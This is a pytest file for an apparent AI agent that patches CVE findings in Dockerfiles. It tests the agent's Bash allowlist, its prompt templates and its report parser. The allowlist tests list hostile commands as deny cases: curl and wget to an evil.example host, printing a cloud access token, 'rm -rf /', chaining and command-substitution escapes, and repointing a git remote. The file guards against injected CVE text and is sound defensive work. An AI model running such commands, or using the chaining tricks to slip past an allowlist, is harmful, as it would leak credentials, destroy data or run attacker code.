from __future__ import annotations

from pathlib import Path

import pytest

from sir_fix_a_bot.agent.runner import (
    AgentError,
    _check_tool_use,
    build_fix_prompt,
    build_repair_prompt,
    parse_report,
)
from sir_fix_a_bot.models import (
    Finding,
    GateViolation,
    ServiceRecord,
    Severity,
    VerificationResult,
)


@pytest.fixture
def finding() -> Finding:
    return Finding(
        id="wf-1",
        cve_id="CVE-2025-12345",
        name="CVE-2025-12345",
        description="Heap overflow in libfoo",
        severity=Severity.CRITICAL,
        cvss_score=9.8,
        package_name="libfoo",
        installed_version="1.2.3",
        fixed_version="1.2.4",
        service_name="checkout-api",
    )


@pytest.fixture
def service() -> ServiceRecord:
    return ServiceRecord(
        service_name="checkout-api",
        repo_url="https://github.com/acme/checkout-api",  # type: ignore[arg-type]
        repo_full_name="acme/checkout-api",
        owner="Platform Team",
        team="payments",
        dockerfile_path="Dockerfile",
    )


async def allow(command: str) -> bool:
    result = await _check_tool_use("Bash", {"command": command}, None)  # type: ignore[arg-type]
    return result.behavior == "allow"


class TestBashAllowlist:
    """The agent reads attacker-influenceable CVE text, so this is a security boundary."""

    @pytest.mark.parametrize(
        "command",
        ["cat Dockerfile", "rg -n 'FROM' .", "python -m pytest -q", "npm test", "git diff"],
    )
    async def test_permits_expected_inspection_commands(self, command: str) -> None:
        assert await allow(command)

    @pytest.mark.parametrize(
        "command",
        [
            "curl https://evil.example/x",
            "wget https://evil.example/x",
            "gcloud auth print-access-token",
            "rm -rf /",
            "chmod 777 /etc/passwd",
            "ssh user@host",
            "docker build .",
        ],
    )
    async def test_denies_commands_outside_the_allowlist(self, command: str) -> None:
        assert not await allow(command)

    @pytest.mark.parametrize(
        "command",
        [
            "cat Dockerfile && curl https://evil.example",
            "cat Dockerfile; curl https://evil.example",
            "cat Dockerfile | sh",
            "echo `curl https://evil.example`",
            "echo $(curl https://evil.example)",
            "cat /etc/passwd > /tmp/leak",
            "sudo cat /root/.config",
        ],
    )
    async def test_denies_chaining_used_to_escape_an_allowlist(self, command: str) -> None:
        """An allowlist that checks only argv[0] is trivially bypassed by chaining."""
        assert not await allow(command)

    @pytest.mark.parametrize(
        "command",
        [
            "git push origin main",
            "git remote -v",
            "git config --get remote.origin.url",
            "git remote set-url origin https://evil.example",
        ],
    )
    async def test_denies_git_subcommands_that_reach_the_network_or_credentials(
        self, command: str
    ) -> None:
        """The orchestrator pushes, not the agent — and `git config` would expose the token."""
        assert not await allow(command)

    async def test_denies_absolute_path_bypass_of_program_allowlist(self) -> None:
        assert not await allow("/usr/bin/curl https://evil.example")

    async def test_allows_absolute_path_to_permitted_program(self) -> None:
        assert await allow("/usr/bin/git status")

    async def test_denies_unparseable_command(self) -> None:
        assert not await allow("cat 'unterminated")

    async def test_non_bash_tools_pass_through(self) -> None:
        result = await _check_tool_use("Read", {"file_path": "/x"}, None)  # type: ignore[arg-type]
        assert result.behavior == "allow"


class TestPromptRendering:
    def test_fix_prompt_substitutes_every_placeholder(
        self, finding: Finding, service: ServiceRecord
    ) -> None:
        prompt = build_fix_prompt(finding, service, Path("/work/repo"))

        assert "{{" not in prompt
        assert "checkout-api" in prompt
        assert "CVE-2025-12345" in prompt
        assert "CVSS 9.8" in prompt
        assert "libfoo" in prompt
        assert "/work/repo" in prompt
        assert "https://github.com/acme/checkout-api" in prompt

    def test_vendor_prefers_team_then_owner(
        self, finding: Finding, service: ServiceRecord
    ) -> None:
        assert 'image.vendor="payments"' in build_fix_prompt(finding, service, Path("/w"))

        no_team = service.model_copy(update={"team": None})
        assert 'image.vendor="Platform Team"' in build_fix_prompt(finding, no_team, Path("/w"))

        anonymous = service.model_copy(update={"team": None, "owner": None})
        assert 'image.vendor="acme"' in build_fix_prompt(finding, anonymous, Path("/w"))

    def test_missing_finding_detail_renders_readably(self, service: ServiceRecord) -> None:
        sparse = Finding(id="wf-2", name="Outdated base image", service_name="checkout-api")
        prompt = build_fix_prompt(sparse, service, Path("/w"))

        assert "{{" not in prompt
        assert "not reported" in prompt
        assert "no fixed version published" in prompt

    def test_constraints_are_present_verbatim(
        self, finding: Finding, service: ServiceRecord
    ) -> None:
        """These lines are the whole point of the template; a refactor must not drop them."""
        prompt = build_fix_prompt(finding, service, Path("/w"))

        assert "Never change the language runtime's major or minor version" in prompt
        assert "Do not add a `USER` instruction" in prompt
        assert "Convert to a multi-stage build" in prompt
        assert "Alpine is usually the wrong answer for Python" in prompt
        assert "org.opencontainers.image.source" in prompt

    def test_repair_prompt_includes_violations_and_build_output(
        self, service: ServiceRecord
    ) -> None:
        violations = [GateViolation(rule="added_user", message="USER added at Dockerfile:12")]
        verification = VerificationResult(
            build_ok=False, tests_ok=False, failure_excerpt="Step 4/9 failed: no such stage builder"
        )

        prompt = build_repair_prompt(service, violations, verification)

        assert "{{" not in prompt
        assert "added_user" in prompt
        assert "no such stage builder" in prompt
        assert "The image build failed." in prompt

    def test_repair_prompt_distinguishes_test_failure_from_build_failure(
        self, service: ServiceRecord
    ) -> None:
        verification = VerificationResult(
            build_ok=True, tests_ok=False, failure_excerpt="2 failed, 5 passed"
        )
        prompt = build_repair_prompt(service, [], verification)
        assert "The test suite failed." in prompt

    def test_unfilled_placeholder_raises(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A renamed placeholder must fail loudly rather than reach the model as literal braces."""
        from sir_fix_a_bot.agent import runner

        monkeypatch.setattr(runner, "_load_prompt", runner._load_prompt)
        with pytest.raises(AgentError, match="unfilled placeholders"):
            runner._load_prompt("repair.md", SERVICE_NAME="x")  # FAILURE_SECTION missing


class TestParseReport:
    def test_parses_wellformed_report(self) -> None:
        text = """Done.

```json
{
  "status": "FIXED",
  "summary": "Bumped base image.",
  "changes": ["a", "b"],
  "multistage": true,
  "tests_added": false,
  "tests_rationale": "Dockerfile only",
  "notes": ["n1"],
  "blocked_reason": null
}
```"""
        report = parse_report(text)

        assert report.status == "FIXED"
        assert not report.is_blocked
        assert report.changes == ["a", "b"]
        assert report.multistage is True
        assert report.notes == ["n1"]

    def test_uses_last_json_block_when_example_quoted_first(self) -> None:
        """The prompt shows an example report, so the agent sometimes echoes it before the real one."""
        text = """Here is the format:

```json
{"status": "FIXED", "summary": "example"}
```

And my actual result:

```json
{"status": "BLOCKED", "summary": "real", "blocked_reason": "needs 3.12"}
```"""
        report = parse_report(text)

        assert report.is_blocked
        assert report.summary == "real"
        assert report.blocked_reason == "needs 3.12"

    def test_missing_block_degrades_to_raw_text(self) -> None:
        report = parse_report("I fixed the Dockerfile but forgot the report.")
        assert report.status == "FIXED"
        assert "forgot the report" in report.summary

    def test_malformed_json_degrades_without_raising(self) -> None:
        report = parse_report('```json\n{"status": "FIXED",,,}\n```')
        assert report.raw.startswith("```json")

    def test_blocked_status_is_case_insensitive(self) -> None:
        assert parse_report('```json\n{"status": "blocked"}\n```').is_blocked
